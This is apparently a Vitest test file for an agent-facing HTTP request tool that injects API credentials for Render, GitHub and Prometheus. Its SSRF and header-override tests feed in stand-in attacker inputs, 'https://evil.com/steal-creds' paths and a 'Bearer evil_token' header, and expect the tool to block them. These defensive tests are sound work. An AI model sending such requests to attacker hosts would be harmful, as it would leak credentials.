import { describe, it, expect, vi, beforeEach } from "vitest"
import { createHttpRequestTool } from "../../tools/http-request.js"
import type { IntegrationWithCredentials } from "../../types/contexts.js"

function makeIntegration(
  overrides?: Partial<IntegrationWithCredentials>,
): IntegrationWithCredentials {
  return {
    id: "conn-1",
    name: "render",
    type: "render",
    enabled: true,
    config: {},
    credentials: { apiKey: "rnd_test_key" },
    ...overrides,
  }
}

describe("createHttpRequestTool", () => {
  it("returns a StructuredTool with correct name", () => {
    const tool = createHttpRequestTool([makeIntegration()])
    expect(tool.name).toBe("http_request")
  })

  it("includes allowed methods in description", () => {
    const tool = createHttpRequestTool([makeIntegration()], {
      allowedMethods: ["GET", "POST"],
    })
    expect(tool.description).toContain("GET, POST")
  })

  it("defaults to GET-only when no allowedMethods specified", () => {
    const tool = createHttpRequestTool([makeIntegration()])
    expect(tool.description).toContain("Allowed methods: GET")
    expect(tool.description).not.toContain("POST")
  })

  it("lists available integrations in description", () => {
    const tool = createHttpRequestTool([
      makeIntegration({ type: "render" }),
      makeIntegration({ id: "conn-2", type: "github", credentials: { apiKey: "ghp_test" } }),
    ])
    expect(tool.description).toContain("render")
    expect(tool.description).toContain("github")
  })

  it("first connection per type wins (no silent overwrite)", () => {
    const tool = createHttpRequestTool([
      makeIntegration({ id: "conn-1", credentials: { apiKey: "first_key" } }),
      makeIntegration({ id: "conn-2", credentials: { apiKey: "second_key" } }),
    ])
    // Both are type "render" — first should win
    expect(tool.description).toContain("render")
  })

  it("skips integrations with missing credentials", () => {
    const tool = createHttpRequestTool([
      makeIntegration({ credentials: {} }), // no apiKey or accessToken
    ])
    expect(tool.description).toContain("none")
  })
})

describe("HttpRequestTool._call", () => {
  let fetchSpy: ReturnType<typeof vi.fn>

  beforeEach(() => {
    fetchSpy = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      statusText: "OK",
      text: () => Promise.resolve(JSON.stringify({ data: "test" })),
    })
    vi.stubGlobal("fetch", fetchSpy)
  })

  it("rejects disallowed HTTP methods", async () => {
    const tool = createHttpRequestTool([makeIntegration()], {
      allowedMethods: ["GET"],
    })

    const result = await tool.invoke({
      integration: "render",
      method: "DELETE",
      path: "/v1/services/srv-123",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Method DELETE is not allowed")
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it("rejects unknown integration", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    const result = await tool.invoke({
      integration: "unknown",
      method: "GET",
      path: "/test",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Unknown integration: unknown")
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it("makes authenticated GET request with correct auth headers", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
    })

    expect(fetchSpy).toHaveBeenCalledTimes(1)
    const [url, options] = fetchSpy.mock.calls[0]
    expect(url).toBe("https://api.render.com/v1/services")
    expect(options.method).toBe("GET")
    expect(options.headers.Authorization).toBe("Bearer rnd_test_key")
  })

  it("substitutes path parameters", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services/{serviceId}/logs",
      pathParams: { serviceId: "srv-abc123" },
    })

    const [url] = fetchSpy.mock.calls[0]
    expect(url).toBe("https://api.render.com/v1/services/srv-abc123/logs")
  })

  it("appends query parameters", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
      queryParams: { limit: "10", cursor: "abc" },
    })

    const [url] = fetchSpy.mock.calls[0]
    expect(url).toContain("limit=10")
    expect(url).toContain("cursor=abc")
  })

  // SSRF prevention tests
  it("rejects absolute URLs in path (SSRF prevention)", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    const result = await tool.invoke({
      integration: "render",
      method: "GET",
      path: "https://evil.com/steal-creds",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Absolute URLs are not allowed")
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it("rejects protocol-relative URLs in path (SSRF prevention)", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    const result = await tool.invoke({
      integration: "render",
      method: "GET",
      path: "//evil.com/steal-creds",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Absolute URLs are not allowed")
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  // Auth header override prevention
  it("prevents agent from overriding Authorization header", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
      headers: { Authorization: "Bearer evil_token" },
    })

    const [, options] = fetchSpy.mock.calls[0]
    // Auth header must be the real credential, not the agent-supplied one
    expect(options.headers.Authorization).toBe("Bearer rnd_test_key")
  })

  it("prevents case-variant auth header override", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
      headers: { AUTHORIZATION: "Bearer evil_token" },
    })

    const [, options] = fetchSpy.mock.calls[0]
    expect(options.headers.Authorization).toBe("Bearer rnd_test_key")
    // Verify no duplicate authorization header in any case
    const authHeaders = Object.keys(options.headers).filter(
      (k) => k.toLowerCase() === "authorization",
    )
    expect(authHeaders).toHaveLength(1)
  })

  it("allows non-auth custom headers", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
      headers: { "X-Custom": "value" },
    })

    const [, options] = fetchSpy.mock.calls[0]
    expect(options.headers["X-Custom"]).toBe("value")
  })

  // Body size limit
  it("rejects oversized request body", async () => {
    const tool = createHttpRequestTool([makeIntegration()], {
      allowedMethods: ["POST"],
    })

    const result = await tool.invoke({
      integration: "render",
      method: "POST",
      path: "/v1/services",
      body: { data: "x".repeat(20_000) },
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Request body too large")
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  // Response truncation
  it("truncates large responses", async () => {
    const largeResponse = "x".repeat(60_000)
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      statusText: "OK",
      text: () => Promise.resolve(largeResponse),
    })

    const tool = createHttpRequestTool([makeIntegration()])
    const result = await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
    })

    expect(result).toContain("...[truncated]")
    expect(result.length).toBeLessThan(60_000)
  })

  // Error handling
  it("returns error for non-OK responses", async () => {
    fetchSpy.mockResolvedValue({
      ok: false,
      status: 404,
      statusText: "Not Found",
      text: () => Promise.resolve("Not Found"),
    })

    const tool = createHttpRequestTool([makeIntegration()])
    const result = await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services/nonexistent",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("HTTP 404")
  })

  it("returns error for network failures", async () => {
    fetchSpy.mockRejectedValue(new Error("Network error"))

    const tool = createHttpRequestTool([makeIntegration()])
    const result = await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
    })

    const parsed = JSON.parse(result)
    expect(parsed.error).toContain("Request failed: Network error")
  })

  // Timeout
  it("passes AbortSignal.timeout to fetch", async () => {
    const tool = createHttpRequestTool([makeIntegration()])

    await tool.invoke({
      integration: "render",
      method: "GET",
      path: "/v1/services",
    })

    const [, options] = fetchSpy.mock.calls[0]
    expect(options.signal).toBeDefined()
  })

  // Prometheus basic auth test
  it("injects basic auth for prometheus", async () => {
    const tool = createHttpRequestTool([
      makeIntegration({
        type: "prometheus",
        config: { baseUrl: "http://prom:9090" },
        credentials: { username: "admin", apiKey: "secret" },
      }),
    ])

    await tool.invoke({
      integration: "prometheus",
      method: "GET",
      path: "/api/v1/query",
      queryParams: { query: "up" },
    })

    const [url, options] = fetchSpy.mock.calls[0]
    expect(url).toContain("prom:9090")
    const expected = `Basic ${Buffer.from("admin:secret").toString("base64")}`
    expect(options.headers.Authorization).toBe(expected)
  })
})
